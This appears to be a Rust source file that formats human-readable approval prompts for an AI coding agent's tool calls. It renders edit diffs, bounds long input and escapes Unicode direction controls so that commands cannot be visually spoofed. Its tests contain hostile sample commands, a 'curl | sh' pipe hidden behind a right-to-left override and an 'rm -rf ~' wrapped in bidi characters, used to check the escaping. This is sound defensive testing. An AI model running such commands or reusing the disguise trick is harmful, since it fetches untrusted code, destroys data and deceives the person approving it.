// SPDX-License-Identifier: Apache-2.0
//! Readable permission facts shared by the native relay and computer bridge.
//! The original input remains the audit record; this is a bounded preview.
use protocol::{
    command::ApprovalDecision,
    model::{
        ApprovalDetailLine, ApprovalKind, ApprovalLineChange, ApprovalQuestion,
        ApprovalQuestionOption,
    },
};
use serde_json::{Value, json};

pub const DETAIL_LIMIT: usize = 800;
/// Lines one proposed change shows before the rest is counted.
const CHANGE_LINES: usize = 12;
/// Characters one line of a proposed change shows.
const CHANGE_WIDTH: usize = 160;
/// Unchanged lines kept either side of a change.
const CONTEXT: usize = 2;
/// Room kept for the "N more lines" that closes a cut change.
const MORE_NOTE: usize = 24;
/// What Claude Code is told when the person denies without saying why.
pub const DENIED_WITHOUT_REASON: &str = "Denied by the person";

#[derive(Debug)]
pub struct ToolApproval {
    pub kind: ApprovalKind,
    pub title: String,
    pub detail: Option<String>,
    pub detail_lines: Vec<ApprovalDetailLine>,
    /// AskUserQuestion's questions, whole, so they can be answered by choice.
    pub questions: Vec<ApprovalQuestion>,
    pub scope: String,
    /// Part of the title or detail was cut; only the original input is whole.
    pub shortened: bool,
}

fn bounded(text: &str, limit: usize, shortened: &mut bool) -> String {
    if text.chars().count() <= limit {
        text.into()
    } else {
        *shortened = true;
        text.chars().take(limit - 1).chain(['…']).collect()
    }
}

fn line(label: Option<&str>, text: impl Into<String>, code: bool) -> ApprovalDetailLine {
    ApprovalDetailLine {
        label: label.map(Into::into),
        text: visible(&text.into()),
        code,
        change: None,
    }
}

/// What `detail` shows before a line's text: its label, or a change's mark.
fn prefix(line: &ApprovalDetailLine) -> String {
    match (line.change, &line.label) {
        (Some(ApprovalLineChange::Removed), _) => "- ".into(),
        (Some(ApprovalLineChange::Added), _) => "+ ".into(),
        (Some(ApprovalLineChange::Unchanged), _) => "  ".into(),
        (Some(ApprovalLineChange::Omitted), _) => "⋯ ".into(),
        (None, Some(label)) => format!("{label}: "),
        (None, None) => String::new(),
    }
}

fn rendered(line: &ApprovalDetailLine) -> String {
    format!("{}{}", prefix(line), line.text)
}

/// One line of a proposed file change before it is fitted into a preview.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ChangeLine {
    pub change: ApprovalLineChange,
    pub text: String,
    /// Lines of the file it stands for; an omitted run stands for several.
    pub lines: usize,
}

impl ChangeLine {
    fn new(change: ApprovalLineChange, text: &str) -> Self {
        Self {
            change,
            text: text.into(),
            lines: 1,
        }
    }
    fn omitted(lines: usize, what: &str) -> Self {
        let plural = if lines == 1 { "" } else { "s" };
        Self {
            change: ApprovalLineChange::Omitted,
            text: format!("{lines} {what}line{plural}"),
            lines,
        }
    }
}

/// A preview's lines in order, with any proposed changes among them.
#[derive(Debug, Clone)]
pub enum Preview {
    Line(ApprovalDetailLine),
    Change(Vec<ChangeLine>),
}

/// An edit's old and new text compared line by line, with a little context
/// either side of each change.
pub fn text_change(old: &str, new: &str) -> Vec<ChangeLine> {
    use ApprovalLineChange::Unchanged;
    // Lines are compared with their endings, so an edit that only adds a
    // final newline or turns CRLF into LF still reads as a change.
    let a: Vec<&str> = old.split_inclusive('\n').collect();
    let b: Vec<&str> = new.split_inclusive('\n').collect();
    let head = a.iter().zip(&b).take_while(|(x, y)| x == y).count();
    let tail = a[head..]
        .iter()
        .rev()
        .zip(b[head..].iter().rev())
        .take_while(|(x, y)| x == y)
        .count();
    let mut marked: Vec<_> = a[..head].iter().map(|text| (Unchanged, *text)).collect();
    marked.extend(aligned(&a[head..a.len() - tail], &b[head..b.len() - tail]));
    marked.extend(a[a.len() - tail..].iter().map(|text| (Unchanged, *text)));
    around_changes(&shown_endings(&marked))
}

/// A line's text without its ending, and the ending.
fn ending(line: &str) -> (&str, &'static str) {
    if let Some(text) = line.strip_suffix("\r\n") {
        (text, "ends in CRLF")
    } else if let Some(text) = line.strip_suffix('\n') {
        (text, "ends in LF")
    } else {
        (line, "no newline at end")
    }
}

/// The lines as shown: without their endings, except that a removed and an
/// added line that differ only in how they end each say how they end.
fn shown_endings(marked: &[(ApprovalLineChange, &str)]) -> Vec<(ApprovalLineChange, String)> {
    use ApprovalLineChange::{Added, Removed, Unchanged};
    use std::collections::HashMap;
    let mut out = Vec::with_capacity(marked.len());
    let mut at = 0;
    while at < marked.len() {
        let end = (at..marked.len())
            .find(|&n| marked[n].0 == Unchanged)
            .map_or(marked.len(), |n| n.max(at + 1));
        // Within one run of changes, the endings each text is removed and
        // added with.
        let mut endings: HashMap<&str, [Vec<&str>; 2]> = HashMap::new();
        for (change, line) in &marked[at..end] {
            let (text, how) = ending(line);
            let side = usize::from(*change == Added);
            if matches!(change, Added | Removed) {
                endings.entry(text).or_default()[side].push(how);
            }
        }
        for (change, line) in &marked[at..end] {
            let (text, how) = ending(line);
            let other = endings
                .get(text)
                .map_or(&[][..], |sides| &sides[usize::from(*change != Added)][..]);
            out.push(if other.iter().any(|o| *o != how) {
                (*change, format!("{text} ({how})"))
            } else {
                (*change, text.into())
            });
        }
        at = end;
    }
    out
}

/// Two changed runs aligned on their longest common run of lines. Runs too
/// long to align cheaply read as all removed, then all added.
fn aligned<'a>(x: &[&'a str], y: &[&'a str]) -> Vec<(ApprovalLineChange, &'a str)> {
    use ApprovalLineChange::{Added, Removed, Unchanged};
    let mut out = Vec::new();
    let (mut i, mut j) = (0, 0);
    if !x.is_empty() && !y.is_empty() && x.len().saturating_mul(y.len()) <= 40_000 {
        // The shorter run is at most 200 lines, so the counts fit.
        let width = y.len() + 1;
        let mut common = vec![0u16; (x.len() + 1) * width];
        for i in (0..x.len()).rev() {
            for j in (0..y.len()).rev() {
                common[i * width + j] = if x[i] == y[j] {
                    common[(i + 1) * width + j + 1] + 1
                } else {
                    common[(i + 1) * width + j].max(common[i * width + j + 1])
                };
            }
        }
        while i < x.len() && j < y.len() {
            if x[i] == y[j] {
                out.push((Unchanged, x[i]));
                (i, j) = (i + 1, j + 1);
            } else if common[(i + 1) * width + j] >= common[i * width + j + 1] {
                out.push((Removed, x[i]));
                i += 1;
            } else {
                out.push((Added, y[j]));
                j += 1;
            }
        }
    }
    out.extend(x[i..].iter().map(|text| (Removed, *text)));
    out.extend(y[j..].iter().map(|text| (Added, *text)));
    out
}

/// Keeps `CONTEXT` unchanged lines either side of each change; a longer
/// unchanged run between two changes is counted instead of shown.
fn around_changes<S: AsRef<str>>(marked: &[(ApprovalLineChange, S)]) -> Vec<ChangeLine> {
    let unchanged = |at: usize| marked[at].0 == ApprovalLineChange::Unchanged;
    if (0..marked.len()).all(unchanged) {
        return Vec::new();
    }
    let mut out = Vec::new();
    let mut at = 0;
    while at < marked.len() {
        let end = (at..marked.len())
            .find(|&n| !unchanged(n))
            .unwrap_or(marked.len());
        if end == at {
            out.push(ChangeLine::new(marked[at].0, marked[at].1.as_ref()));
            at += 1;
            continue;
        }
        let run = &marked[at..end];
        let before = if at == 0 { 0 } else { CONTEXT };
        let after = if end == marked.len() { 0 } else { CONTEXT };
        let keep = |part: &[(ApprovalLineChange, S)], out: &mut Vec<ChangeLine>| {
            out.extend(
                part.iter()
                    .map(|(change, text)| ChangeLine::new(*change, text.as_ref())),
            );
        };
        if run.len() <= before + after + usize::from(before > 0 && after > 0) {
            keep(run, &mut out);
        } else {
            keep(&run[..before], &mut out);
            if before > 0 && after > 0 {
                out.push(ChangeLine::omitted(
                    run.len() - before - after,
                    "unchanged ",
                ));
            }
            keep(&run[run.len() - after..], &mut out);
        }
        at = end;
    }
    out
}

/// A unified diff's lines, marked. File headers are left out; the lines
/// between two hunks are counted from their headers.
pub fn unified_change(diff: &str) -> Vec<ChangeLine> {
    use ApprovalLineChange::{Added, Removed, Unchanged};
    let mut out = Vec::new();
    let mut in_hunk = false;
    let mut resumes: Option<usize> = None;
    for text in diff.lines() {
        if let Some(header) = text.strip_prefix("@@ ") {
            let old = header
                .split_whitespace()
                .next()
                .and_then(|range| range.strip_prefix('-'))
                .and_then(|range| {
                    let mut parts = range.split(',');
                    let start: usize = parts.next()?.parse().ok()?;
                    let count: usize = parts.next().map_or(Some(1), |n| n.parse().ok())?;
                    Some((start, count))
                });
            if let (Some(resumes), Some((start, _))) = (resumes, old)
                && start > resumes
            {
                out.push(ChangeLine::omitted(start - resumes, "unchanged "));
            }
            resumes = old.map(|(start, count)| start + count);
            in_hunk = true;
            continue;
        }
        if !in_hunk
            && ["--- ", "+++ ", "diff ", "index "]
                .iter()
                .any(|h| text.starts_with(h))
        {
            continue;
        }
        let (change, rest) = match text.chars().next() {
            Some('+') => (Added, &text[1..]),
            Some('-') => (Removed, &text[1..]),
            Some(' ') => (Unchanged, &text[1..]),
            // "\ No newline at end of file"
            Some('\\') => continue,
            _ => (Unchanged, text),
        };
        out.push(ChangeLine::new(change, rest));
    }
    out
}

/// Every line of `content`, marked as `change`: a new or deleted file.
pub fn whole_change(content: &str, change: ApprovalLineChange) -> Vec<ChangeLine> {
    content
        .lines()
        .map(|text| ChangeLine::new(change, text))
        .collect()
}

/// As many of `changes` as a preview can show, the rest counted in one line,
/// for a change kept until its approval arrives.
pub fn kept(mut changes: Vec<ChangeLine>) -> Vec<ChangeLine> {
    if changes.len() > CHANGE_LINES {
        let rest = changes.split_off(CHANGE_LINES);
        changes.push(ChangeLine::omitted(
            rest.iter().map(|change| change.lines).sum(),
            "more ",
        ));
    }
    changes
}

/// Fits proposed changes around a preview's other lines. Each change shows at
/// most `CHANGE_LINES` lines of `CHANGE_WIDTH` characters within what
/// `DETAIL_LIMIT` leaves, and closes with how many lines it could not show.
pub fn previewed(parts: Vec<Preview>, shortened: &mut bool) -> Vec<ApprovalDetailLine> {
    let length = |line: &ApprovalDetailLine| rendered(line).chars().count() + 1;
    let mut room = DETAIL_LIMIT.saturating_sub(
        parts
            .iter()
            .map(|part| match part {
                Preview::Line(line) => length(line),
                Preview::Change(_) => 0,
            })
            .sum(),
    );
    let marked = |change: &ChangeLine, cut: &mut bool| ApprovalDetailLine {
        label: None,
        text: visible(&bounded(&change.text, CHANGE_WIDTH, cut)),
        code: change.change != ApprovalLineChange::Omitted,
        change: Some(change.change),
    };
    let mut out = Vec::new();
    for part in parts {
        let changes = match part {
            Preview::Line(line) => {
                out.push(line);
                continue;
            }
            Preview::Change(changes) => changes,
        };
        let mut shown = 0;
        while shown < changes.len().min(CHANGE_LINES) {
            let mut cut = false;
            let line = marked(&changes[shown], &mut cut);
            let more = if shown + 1 < changes.len() {
                MORE_NOTE
            } else {
                0
            };
            if length(&line) + more > room {
                break;
            }
            room -= length(&line);
            *shortened |= cut;
            out.push(line);
            shown += 1;
        }
        if shown < changes.len() {
            *shortened = true;
            let rest = changes[shown..].iter().map(|change| change.lines).sum();
            let note = marked(&ChangeLine::omitted(rest, "more "), &mut false);
            room = room.saturating_sub(length(&note));
            out.push(note);
        }
    }
    out
}

/// Cuts the lines where `bounded` would cut their joined text. A cut that would
/// fall between lines or inside a label ends the last whole line instead.
fn fit(lines: Vec<ApprovalDetailLine>, shortened: &mut bool) -> Vec<ApprovalDetailLine> {
    let length = |line: &ApprovalDetailLine| rendered(line).chars().count();
    if lines.iter().map(length).sum::<usize>() + lines.len().saturating_sub(1) <= DETAIL_LIMIT {
        return lines;
    }
    *shortened = true;
    let mut room = DETAIL_LIMIT - 1;
    let mut kept: Vec<ApprovalDetailLine> = Vec::new();
    for mut line in lines {
        let prefix = prefix(&line).chars().count() + usize::from(!kept.is_empty());
        let text = line.text.chars().count();
        if prefix + text <= room {
            room -= prefix + text;
            kept.push(line);
            continue;
        }
        match kept.last_mut() {
            Some(last) if room <= prefix => last.text.push('…'),
            _ => {
                line.text = line
                    .text
                    .chars()
                    .take(room.saturating_sub(prefix))
                    .chain(['…'])
                    .collect();
                kept.push(line);
            }
        }
        break;
    }
    kept
}

/// Direction controls reorder the text shown around them, so a command could
/// read as a different one. Approvals show each as its JSON escape instead.
pub fn visible(text: &str) -> String {
    let mut shown = String::with_capacity(text.len());
    for c in text.chars() {
        if crate::library::direction_control(c) {
            shown.push_str(&format!("\\u{:04x}", u32::from(c)));
        } else {
            shown.push(c);
        }
    }
    shown
}

/// The whole request as the person may inspect it. Direction controls occur
/// only inside JSON strings, where their escape is the same JSON.
pub fn raw_request(input: &Value) -> String {
    visible(&input.to_string())
}

/// Bounded detail for a native request an adapter reads itself: code is cut
/// like a shell command, then the lines are fitted like any other preview.
pub fn native_detail(
    lines: Vec<ApprovalDetailLine>,
    shortened: &mut bool,
) -> (Option<String>, Vec<ApprovalDetailLine>) {
    let lines = lines
        .into_iter()
        .map(|mut line| {
            line.text = visible(&line.text);
            if line.code {
                line.text = bounded(&line.text, 640, shortened);
            }
            line
        })
        .collect::<Vec<_>>();
    if lines.is_empty() {
        return (None, lines);
    }
    let lines = fit(lines, shortened);
    let detail = lines.iter().map(rendered).collect::<Vec<_>>().join("\n");
    (Some(detail), lines)
}

/// AskUserQuestion's questions in the shape its documentation gives: one to
/// four questions of up to four options, with distinct questions and labels.
/// Anything else is shown as plain input and answered in words.
fn asked(input: &Value) -> Vec<ApprovalQuestion> {
    fn text(value: Option<&Value>, limit: usize) -> Option<String> {
        value?
            .as_str()
            .filter(|text| !text.trim().is_empty() && text.chars().count() <= limit)
            .map(Into::into)
    }
    let parse = || -> Option<Vec<ApprovalQuestion>> {
        let questions = input.get("questions")?.as_array()?;
        if !(1..=4).contains(&questions.len()) {
            return None;
        }
        let questions = questions
            .iter()
            .map(|question| {
                let options = question.get("options")?.as_array()?;
                if !(1..=4).contains(&options.len()) {
                    return None;
                }
                let options = options
                    .iter()
                    .map(|option| {
                        Some(ApprovalQuestionOption {
                            label: text(option.get("label"), 200)?,
                            description: text(option.get("description"), 1000),
                        })
                    })
                    .collect::<Option<Vec<_>>>()?;
                let labels: std::collections::HashSet<_> =
                    options.iter().map(|option| &option.label).collect();
                (labels.len() == options.len()).then_some(())?;
                Some(ApprovalQuestion {
                    id: None,
                    header: text(question.get("header"), 60),
                    question: text(question.get("question"), 1000)?,
                    options,
                    multi_select: question["multiSelect"] == true,
                    secret: false,
                })
            })
            .collect::<Option<Vec<_>>>()?;
        let distinct: std::collections::HashSet<_> = questions
            .iter()
            .map(|question| &question.question)
            .collect();
        (distinct.len() == questions.len()).then_some(questions)
    };
    parse().unwrap_or_default()
}

/// Claude Code's reply to a permission prompt. An answered AskUserQuestion is
/// allowed with its questions passed through and the answers keyed by
/// question; several choices are joined with ", " as Claude Code documents.
/// Words that answer no particular question go back as the general response.
pub fn permission_reply(tool: &str, input: Value, decision: ApprovalDecision) -> Value {
    match decision {
        ApprovalDecision::Allow => json!({"behavior":"allow","updatedInput":input}),
        ApprovalDecision::Deny { reason } => json!({
            "behavior":"deny",
            "message":reason.as_deref().unwrap_or(DENIED_WITHOUT_REASON),
        }),
        ApprovalDecision::Answer { text, answers } if tool == "AskUserQuestion" => {
            let questions = input.get("questions").cloned().unwrap_or(json!([]));
            let reply = if !answers.is_empty() {
                let answers: serde_json::Map<_, _> = answers
                    .into_iter()
                    .map(|answer| (answer.question, answer.choices.join(", ").into()))
                    .collect();
                json!({"questions":questions,"answers":answers})
            } else if let [only] = questions.as_array().map_or(&[][..], Vec::as_slice)
                && let Some(question) = only["question"].as_str()
            {
                json!({"questions":questions,"answers":{question:text}})
            } else {
                json!({"questions":questions,"answers":{},"response":text})
            };
            json!({"behavior":"allow","updatedInput":reply})
        }
        ApprovalDecision::Answer { .. } => json!({
            "behavior":"deny",
            "message":"A tool permission requires an Allow decision",
        }),
    }
}

pub fn tool_approval(tool: &str, input: &Value) -> ToolApproval {
    let field = |keys: &[&str]| -> Option<&str> {
        keys.iter()
            .filter_map(|key| input.get(key)?.as_str())
            .find(|value| !value.trim().is_empty())
    };
    let path = || field(&["file_path", "notebook_path", "path"]);
    let mut parts = Vec::new();
    let mut changes = Vec::new();
    let mut shortened = false;
    let questions = if tool == "AskUserQuestion" {
        asked(input)
    } else {
        Vec::new()
    };
    let (kind, title) = match tool {
        "Bash" => {
            if let Some(command) = field(&["command"]) {
                parts.push(line(None, bounded(command, 640, &mut shortened), true));
            }
            if let Some(description) = field(&["description"]) {
                parts.push(line(None, description, false));
            }
            (ApprovalKind::Command, "Run a shell command".into())
        }
        "Edit" | "Write" | "MultiEdit" | "NotebookEdit" => {
            if let Some(path) = path() {
                parts.push(line(None, path, true));
            }
            match tool {
                "Edit" => {
                    if let (Some(old), Some(new)) =
                        (input["old_string"].as_str(), input["new_string"].as_str())
                    {
                        let occurrences = if input["replace_all"] == true {
                            "all matches"
                        } else {
                            "one match"
                        };
                        parts.push(line(
                            None,
                            format!(
                                "Replace {occurrences}: {} → {} characters",
                                old.chars().count(),
                                new.chars().count()
                            ),
                            false,
                        ));
                        changes.push(Preview::Change(text_change(old, new)));
                    }
                }
                "Write" => {
                    if let Some(content) = input["content"].as_str() {
                        let count = content.chars().count();
                        parts.push(line(None, format!("Write {count} characters"), false));
                        changes.push(Preview::Change(whole_change(
                            content,
                            ApprovalLineChange::Added,
                        )));
                    }
                }
                "MultiEdit" => {
                    if let Some(edits) = input["edits"].as_array() {
                        parts.push(line(None, format!("{} edits", edits.len()), false));
                        let readable = edits
                            .iter()
                            .filter_map(|edit| {
                                Some((edit["old_string"].as_str()?, edit["new_string"].as_str()?))
                            })
                            .collect::<Vec<_>>();
                        for (at, (old, new)) in readable.iter().enumerate() {
                            if readable.len() > 1 {
                                changes.push(Preview::Line(line(
                                    None,
                                    format!("Edit {} of {}", at + 1, readable.len()),
                                    false,
                                )));
                            }
                            changes.push(Preview::Change(text_change(old, new)));
                        }
                    }
                }
                _ => {
                    if let Some(mode) = field(&["edit_mode"]) {
                        parts.push(line(None, format!("Cell change: {mode}"), false));
                    }
                    if let Some(cell) = field(&["cell_id"]) {
                        parts.push(line(None, format!("Cell: {cell}"), false));
                    }
                    if let Some(source) = input["new_source"].as_str()
                        && field(&["edit_mode"]) != Some("delete")
                    {
                        changes.push(Preview::Change(whole_change(
                            source,
                            ApprovalLineChange::Added,
                        )));
                    }
                }
            }
            (ApprovalKind::FileEdit, "Edit a file".into())
        }
        "WebFetch" => {
            if let Some(url) = field(&["url"]) {
                parts.push(line(None, url, true));
            }
            (ApprovalKind::Network, "Use WebFetch".into())
        }
        "WebSearch" => {
            if let Some(query) = field(&["query"]) {
                parts.push(line(None, query, false));
            }
            (ApprovalKind::Network, "Search the web".into())
        }
        "Grep" | "Glob" => {
            if let Some(pattern) = field(&["pattern"]) {
                parts.push(line(Some("Pattern"), pattern, true));
            }
            parts.push(match field(&["path"]) {
                Some(path) => line(Some("Path"), path, true),
                None => line(Some("Path"), "project directory (default)", false),
            });
            (ApprovalKind::Tool, format!("Use {tool}"))
        }
        "AskUserQuestion" if !questions.is_empty() => {
            for question in &questions {
                parts.push(line(question.header.as_deref(), &question.question, false));
                if question.multi_select {
                    parts.push(line(None, "Choose one or more", false));
                }
                for option in &question.options {
                    parts.push(match &option.description {
                        Some(description) => line(Some(&option.label), description, false),
                        None => line(None, &option.label, false),
                    });
                }
            }
            let title = match &questions[..] {
                [only] => visible(&bounded(&only.question, 200, &mut shortened)),
                several => format!("Answer {} questions", several.len()),
            };
            (ApprovalKind::Question, title)
        }
        _ => (
            if tool == "AskUserQuestion" {
                ApprovalKind::Question
            } else {
                ApprovalKind::Tool
            },
            format!("Use {}", visible(&bounded(tool, 80, &mut shortened))),
        ),
    };
    if parts.is_empty() {
        if let Some(fields) = input.as_object() {
            for (key, value) in fields {
                let scalar = match value {
                    Value::String(s) if !s.trim().is_empty() => s.clone(),
                    Value::Bool(_) | Value::Number(_) => value.to_string(),
                    _ => continue,
                };
                let text = format!(
                    "{}: {}",
                    bounded(key, 60, &mut shortened),
                    bounded(&scalar, 160, &mut shortened)
                );
                parts.push(line(None, text, false));
                if parts.len() == 4 {
                    break;
                }
            }
        } else if let Some(text) = input.as_str() {
            parts.push(line(None, text, false));
        }
    }
    let detail_lines = if parts.is_empty() {
        vec![line(None, "No readable input fields supplied.", false)]
    } else {
        let parts = parts
            .into_iter()
            .map(Preview::Line)
            .chain(changes)
            .collect();
        fit(previewed(parts, &mut shortened), &mut shortened)
    };
    let detail = detail_lines
        .iter()
        .map(rendered)
        .collect::<Vec<_>>()
        .join("\n");
    ToolApproval {
        kind,
        title,
        detail: Some(detail),
        detail_lines,
        scope: if questions.is_empty() {
            "This request once"
        } else {
            "Only your answer; nothing runs"
        }
        .into(),
        questions,
        shortened,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // Found by fuzzing. Serde_json's default float parsing is only nearly
    // right, so the text written for a float read back one unit in the last
    // place away: the request shown, and echoed back to the agent, differed.
    #[test]
    fn a_raw_request_reads_back_to_the_same_numbers() {
        for number in [
            "2222222200000000000000000001398078476",
            "2.2222222e36",
            "0.1",
            "-1.7976931348623157e308",
            "5e-324",
        ] {
            let input: Value = serde_json::from_str(&format!("{{\"n\":{number}}}")).unwrap();
            let raw = raw_request(&input);
            assert_eq!(
                serde_json::from_str::<Value>(&raw).unwrap(),
                input,
                "{number}"
            );
            assert_eq!(raw_request(&serde_json::from_str(&raw).unwrap()), raw);
        }
    }
    use protocol::command::QuestionAnswer;
    #[test]
    fn simulator_fixtures_match_companion_facts() {
        let cases: Value =
            serde_json::from_str(include_str!("../test-fixtures/tool-approvals.json")).unwrap();
        for case in cases.as_array().unwrap() {
            let facts = tool_approval(case["tool"].as_str().unwrap(), &case["input"]);
            let mut approval = serde_json::json!({"kind":facts.kind,"title":facts.title,"detail":facts.detail,"detail_lines":facts.detail_lines,"scope":facts.scope,"shortened":facts.shortened});
            if !facts.questions.is_empty() {
                approval["questions"] = serde_json::json!(facts.questions);
            }
            assert_eq!(approval, case["approval"]);
        }
    }
    #[test]
    fn direction_controls_are_shown_not_obeyed() {
        // U+202E would show the rest of the command reversed.
        let input = json!({"command":"curl -s x | sh #\u{202E}stset tinu nuR","description":"Run \u{2066}tests\u{2069}"});
        let facts = tool_approval("Bash", &input);
        let shown = format!(
            "{} {} {:?}",
            facts.title,
            facts.detail.as_deref().unwrap(),
            facts.detail_lines
        );
        let controls = [
            '\u{061C}', '\u{200E}', '\u{200F}', '\u{202A}', '\u{202B}', '\u{202C}', '\u{202D}',
            '\u{202E}', '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}',
        ];
        assert!(!shown.contains(controls), "{shown}");
        assert!(facts.detail.unwrap().contains("#\\u202estset"));
        assert!(
            !tool_approval("\u{202E}hsaB", &json!({}))
                .title
                .contains(controls)
        );
        let raw = raw_request(&input);
        assert!(!raw.contains(controls), "{raw}");
        assert_eq!(serde_json::from_str::<Value>(&raw).unwrap(), input);
        let mut shortened = false;
        let (detail, lines) = native_detail(
            vec![ApprovalDetailLine {
                label: None,
                text: "rm -rf \u{2067}~\u{2069}".into(),
                code: true,
                change: None,
            }],
            &mut shortened,
        );
        assert!(!detail.unwrap().contains(controls));
        assert!(!lines[0].text.contains(controls));
    }
    #[test]
    fn long_unicode_input_is_bounded_and_marked() {
        let facts = tool_approval(
            "Bash",
            &serde_json::json!({"command":"界".repeat(2000),"description":"d".repeat(2000)}),
        );
        let detail = facts.detail.unwrap();
        assert_eq!(detail.chars().count(), DETAIL_LIMIT);
        assert!(detail.ends_with('…'));
        assert!(facts.shortened);
        let [command, description] = &facts.detail_lines[..] else {
            panic!("expected the command and a cut description")
        };
        assert!(command.code && command.text.chars().count() == 640);
        assert!(!description.code && description.text.ends_with('…'));
        assert_eq!(format!("{}\n{}", command.text, description.text), detail);
    }
    #[test]
    fn a_cut_between_lines_ends_the_last_whole_line() {
        let pattern = "p".repeat(DETAIL_LIMIT - 1 - "Pattern: ".len());
        let facts = tool_approval("Grep", &serde_json::json!({"pattern":pattern,"path":"src"}));
        assert!(facts.shortened);
        assert_eq!(
            facts.detail_lines,
            [line(Some("Pattern"), format!("{pattern}…"), true)]
        );
        assert_eq!(facts.detail.unwrap(), format!("Pattern: {pattern}…"));
    }
    #[test]
    fn code_keeps_its_own_line_breaks() {
        let facts = tool_approval(
            "Bash",
            &serde_json::json!({"command":"cd crates\n  cargo test","description":"Run the tests"}),
        );
        assert_eq!(
            facts.detail_lines,
            [
                line(None, "cd crates\n  cargo test", true),
                line(None, "Run the tests", false)
            ]
        );
        assert_eq!(
            facts.detail.unwrap(),
            "cd crates\n  cargo test\nRun the tests"
        );
    }
    #[test]
    fn only_a_cut_marks_the_request_shortened() {
        let command =
            |length| tool_approval("Bash", &serde_json::json!({"command":"…".repeat(length)}));
        assert!(!command(640).shortened);
        assert!(command(641).shortened);
        assert!(tool_approval("Archive", &serde_json::json!({"note":"x".repeat(161)})).shortened);
        assert!(tool_approval(&"T".repeat(81), &serde_json::json!({})).shortened);
        let whole = command(640).detail.unwrap();
        assert!(whole.ends_with('…') && whole.chars().count() == 640);
    }
    #[test]
    fn questions_outside_the_documented_shape_are_answered_in_words() {
        let question = |label: &str| json!({"question":format!("Pick {label}"),"options":[{"label":"A"},{"label":label}]});
        let asks =
            |questions: Value| tool_approval("AskUserQuestion", &json!({"questions":questions}));
        assert_eq!(asks(json!([question("B")])).questions.len(), 1);
        for odd in [
            json!([]),
            json!([
                question("B"),
                question("C"),
                question("D"),
                question("E"),
                question("F")
            ]),
            json!([question("A")]),
            json!([question("B"), question("B")]),
            json!([{"question":" ","options":[{"label":"A"}]}]),
            json!([{"question":"Pick","options":[]}]),
            json!([{"question":"Pick","options":[{"label":"x".repeat(201)}]}]),
        ] {
            let facts = asks(odd);
            assert!(facts.questions.is_empty());
            assert_eq!(facts.kind, ApprovalKind::Question);
            assert_eq!(facts.scope, "This request once");
        }
    }
    #[test]
    fn an_answer_is_allowed_with_the_questions_passed_through() {
        let questions = json!([
            {"question":"How should totals be rounded?","header":"Rounding","options":[{"label":"Nearest cent"},{"label":"Always up"}]},
            {"question":"Which reports?","multiSelect":true,"options":[{"label":"Invoices"},{"label":"Receipts"}]}
        ]);
        let input = json!({"questions":questions});
        let answer = |text: &str, answers: &[(&str, &[&str])]| ApprovalDecision::Answer {
            text: text.into(),
            answers: answers
                .iter()
                .map(|(question, choices)| QuestionAnswer {
                    id: None,
                    question: (*question).into(),
                    choices: choices.iter().map(|&choice| choice.into()).collect(),
                })
                .collect(),
        };
        assert_eq!(
            permission_reply(
                "AskUserQuestion",
                input.clone(),
                answer(
                    "Rounding: Always up; Which reports?: Invoices, Only paid ones",
                    &[
                        ("How should totals be rounded?", &["Always up"]),
                        ("Which reports?", &["Invoices", "Only paid ones"])
                    ]
                )
            ),
            json!({"behavior":"allow","updatedInput":{"questions":questions,"answers":{
                "How should totals be rounded?":"Always up",
                "Which reports?":"Invoices, Only paid ones"
            }}})
        );
        assert_eq!(
            permission_reply(
                "AskUserQuestion",
                input.clone(),
                answer("Whatever is simplest", &[])
            ),
            json!({"behavior":"allow","updatedInput":{"questions":questions,"answers":{},"response":"Whatever is simplest"}})
        );
        let one = json!({"questions":[questions[0].clone()]});
        assert_eq!(
            permission_reply("AskUserQuestion", one.clone(), answer("Nearest cent", &[])),
            json!({"behavior":"allow","updatedInput":{"questions":one["questions"],"answers":{"How should totals be rounded?":"Nearest cent"}}})
        );
        assert_eq!(
            permission_reply("Bash", json!({"command":"ls"}), answer("yes", &[])),
            json!({"behavior":"deny","message":"A tool permission requires an Allow decision"})
        );
        assert_eq!(
            permission_reply(
                "AskUserQuestion",
                input.clone(),
                ApprovalDecision::Deny { reason: None }
            ),
            json!({"behavior":"deny","message":"Denied by the person"})
        );
        assert_eq!(
            permission_reply("Bash", json!({"command":"ls"}), ApprovalDecision::Allow),
            json!({"behavior":"allow","updatedInput":{"command":"ls"}})
        );
    }

    fn marks(facts: &ToolApproval) -> Vec<(ApprovalLineChange, &str)> {
        facts
            .detail_lines
            .iter()
            .filter_map(|line| Some((line.change?, line.text.as_str())))
            .collect()
    }
    use ApprovalLineChange::{Added, Omitted, Removed, Unchanged};

    #[test]
    fn an_edit_reads_as_its_changed_lines_with_context() {
        let old = "fn total() {\n    let a = 1;\n    let b = 2;\n    a + b\n}\n// end\n// really";
        let new = "fn total() {\n    let a = 1;\n    let b = 3;\n    a + b\n}\n// end\n// really";
        let facts = tool_approval(
            "Edit",
            &json!({"file_path":"src/sum.rs","old_string":old,"new_string":new}),
        );
        assert_eq!(
            marks(&facts),
            [
                (Unchanged, "fn total() {"),
                (Unchanged, "    let a = 1;"),
                (Removed, "    let b = 2;"),
                (Added, "    let b = 3;"),
                (Unchanged, "    a + b"),
                (Unchanged, "}"),
            ]
        );
        assert!(
            facts
                .detail_lines
                .iter()
                .all(|line| line.change.is_none() || line.code)
        );
        assert_eq!(
            facts.detail.unwrap(),
            "src/sum.rs\nReplace one match: 71 → 71 characters\n  fn total() {\n      let a = 1;\n-     let b = 2;\n+     let b = 3;\n      a + b\n  }"
        );
        assert!(!facts.shortened);
    }

    #[test]
    fn an_edit_to_line_endings_alone_still_reads_as_a_change() {
        let edit = |old: &str, new: &str| {
            tool_approval(
                "Edit",
                &json!({"file_path":"a","old_string":old,"new_string":new}),
            )
        };
        assert_eq!(
            marks(&edit("a\nb", "a\nb\n")),
            [
                (Unchanged, "a"),
                (Removed, "b (no newline at end)"),
                (Added, "b (ends in LF)"),
            ]
        );
        assert_eq!(
            marks(&edit("x\r\ny\r\n", "x\ny\n")),
            [
                (Removed, "x (ends in CRLF)"),
                (Removed, "y (ends in CRLF)"),
                (Added, "x (ends in LF)"),
                (Added, "y (ends in LF)"),
            ]
        );
        // Endings the edit keeps are not shown, nor is the carriage return.
        assert_eq!(
            marks(&edit("a\r\nb\r\n", "a\r\nc\r\n")),
            [(Unchanged, "a"), (Removed, "b"), (Added, "c")]
        );
    }

    #[test]
    fn a_long_unchanged_stretch_between_changes_is_counted() {
